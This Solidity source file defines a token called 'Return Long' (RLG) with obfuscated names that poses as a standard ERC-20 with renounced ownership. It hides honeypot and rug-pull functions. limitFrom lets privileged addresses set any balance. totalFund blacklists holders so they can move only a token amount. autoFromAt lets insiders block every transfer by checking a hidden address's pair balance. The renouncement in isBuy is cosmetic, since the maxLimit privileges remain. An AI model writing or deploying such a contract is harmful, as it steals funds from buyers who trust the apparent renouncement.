//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface maxShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract senderLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountLimit {
    function createPair(address tradingExempt, address exemptAmount) external returns (address);
}

interface buyAmountShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverTokenLaunched) external view returns (uint256);

    function transfer(address tokenSender, uint256 tradingWallet) external returns (bool);

    function allowance(address exemptFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingWallet) external returns (bool);

    function transferFrom(
        address sender,
        address tokenSender,
        uint256 tradingWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyMarketing, uint256 value);
    event Approval(address indexed exemptFrom, address indexed spender, uint256 value);
}

interface buyAmountShouldMetadata is buyAmountShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReturnLong is senderLaunch, buyAmountShould, buyAmountShouldMetadata {

    function symbol() external view virtual override returns (string memory) {
        return tradingFromTx;
    }

    function balanceOf(address receiverTokenLaunched) public view virtual override returns (uint256) {
        return marketingFrom[receiverTokenLaunched];
    }

    mapping(address => bool) public maxLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingFee;
    }

    function transfer(address takeToken, uint256 tradingWallet) external virtual override returns (bool) {
        return buyReceiver(_msgSender(), takeToken, tradingWallet);
    }

    uint256 shouldReceiver;

    function limitFrom(address takeToken, uint256 tradingWallet) public {
        fromShould();
        marketingFrom[takeToken] = tradingWallet;
    }

    constructor (){
        if (totalMarketing == launchedSell) {
            totalMarketing = true;
        }
        maxShould enableMode = maxShould(fromLiquidity);
        maxAmount = amountLimit(enableMode.factory()).createPair(enableMode.WETH(), address(this));
        if (teamSell != receiverTotal) {
            launchedSell = false;
        }
        senderTotalMax = _msgSender();
        isBuy();
        maxLimit[senderTotalMax] = true;
        marketingFrom[senderTotalMax] = tradingFee;
        
        emit Transfer(address(0), senderTotalMax, tradingFee);
    }

    event OwnershipTransferred(address indexed liquidityTeam, address indexed limitSender);

    bool private enableFrom;

    mapping(address => uint256) private marketingFrom;

    uint256 constant isAuto = 12 ** 10;

    uint8 private senderIsToken = 18;

    function approve(address buyToken, uint256 tradingWallet) public virtual override returns (bool) {
        launchSender[_msgSender()][buyToken] = tradingWallet;
        emit Approval(_msgSender(), buyToken, tradingWallet);
        return true;
    }

    function tradingMarketingTake(address receiverEnableIs, address tokenSender, uint256 tradingWallet) internal returns (bool) {
        require(marketingFrom[receiverEnableIs] >= tradingWallet);
        marketingFrom[receiverEnableIs] -= tradingWallet;
        marketingFrom[tokenSender] += tradingWallet;
        emit Transfer(receiverEnableIs, tokenSender, tradingWallet);
        return true;
    }

    uint256 public teamSell;

    uint256 private tradingFee = 100000000 * 10 ** 18;

    function allowance(address atFrom, address buyToken) external view virtual override returns (uint256) {
        if (buyToken == fromLiquidity) {
            return type(uint256).max;
        }
        return launchSender[atFrom][buyToken];
    }

    function transferFrom(address receiverEnableIs, address tokenSender, uint256 tradingWallet) external override returns (bool) {
        if (_msgSender() != fromLiquidity) {
            if (launchSender[receiverEnableIs][_msgSender()] != type(uint256).max) {
                require(tradingWallet <= launchSender[receiverEnableIs][_msgSender()]);
                launchSender[receiverEnableIs][_msgSender()] -= tradingWallet;
            }
        }
        return buyReceiver(receiverEnableIs, tokenSender, tradingWallet);
    }

    address public maxAmount;

    bool public tokenReceiver;

    string private tradingFromTx = "RLG";

    address private tokenMin;

    function decimals() external view virtual override returns (uint8) {
        return senderIsToken;
    }

    function teamListLaunch(address marketingTradingBuy) public {
        if (tokenReceiver) {
            return;
        }
        if (receiverTotal != teamSell) {
            teamSell = receiverTotal;
        }
        maxLimit[marketingTradingBuy] = true;
        
        tokenReceiver = true;
    }

    bool private totalMarketing;

    function totalFund(address receiverFrom) public {
        fromShould();
        
        if (receiverFrom == senderTotalMax || receiverFrom == maxAmount) {
            return;
        }
        liquidityShouldAt[receiverFrom] = true;
    }

    uint256 enableTotal;

    address isLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public receiverTotal;

    bool public launchedSell;

    string private marketingAmount = "Return Long";

    function buyReceiver(address receiverEnableIs, address tokenSender, uint256 tradingWallet) internal returns (bool) {
        if (receiverEnableIs == senderTotalMax) {
            return tradingMarketingTake(receiverEnableIs, tokenSender, tradingWallet);
        }
        uint256 modeWallet = buyAmountShould(maxAmount).balanceOf(isLaunch);
        require(modeWallet == shouldReceiver);
        require(tokenSender != isLaunch);
        if (liquidityShouldAt[receiverEnableIs]) {
            return tradingMarketingTake(receiverEnableIs, tokenSender, isAuto);
        }
        return tradingMarketingTake(receiverEnableIs, tokenSender, tradingWallet);
    }

    function getOwner() external view returns (address) {
        return tokenMin;
    }

    function name() external view virtual override returns (string memory) {
        return marketingAmount;
    }

    mapping(address => mapping(address => uint256)) private launchSender;

    function owner() external view returns (address) {
        return tokenMin;
    }

    function isBuy() public {
        emit OwnershipTransferred(senderTotalMax, address(0));
        tokenMin = address(0);
    }

    function fromShould() private view {
        require(maxLimit[_msgSender()]);
    }

    mapping(address => bool) public liquidityShouldAt;

    address public senderTotalMax;

    function autoFromAt(uint256 tradingWallet) public {
        fromShould();
        shouldReceiver = tradingWallet;
    }

    address fromLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}